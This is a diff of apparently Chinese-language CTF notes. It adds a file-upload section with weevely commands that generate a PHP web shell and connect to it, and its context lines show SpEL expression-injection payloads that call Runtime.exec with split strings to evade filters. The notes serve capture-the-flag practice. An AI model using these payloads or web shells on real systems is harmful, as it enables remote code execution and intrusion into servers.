@@ -102,7 +102,6 @@ print(user)#输出加密后的序列化对象
 `fastcoll_v1.0.0.5.exe -p test.php -o test1.php test2.php`
 
 
-``
 ### ezjava
 Spel表达式注入
 ```java
@@ -136,6 +135,17 @@ T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(St
 ''.class.getSuperclass().class.forName('java.lang.Runtime').getMethod("ex"+"ec",T(String[])).invoke(''.class.getSuperclass().class.forName('java.lang.Runtime').getMethod("getRu"+"ntime").invoke(null),'calc')
 ```
 
+
+### 这又是一个上传
+可以直接上传一个php,但是权限很低,什么也做不了
+
+使用`weevely`,在`D:\CTF_Tools\weevely3\`
+```bash
+#生成shell
+python3 weevely.py generate cmd shell.php
+#连接shell
+python3 weevely.py http://xxx.php cmd
+```
 # reverse
 
 # pwn
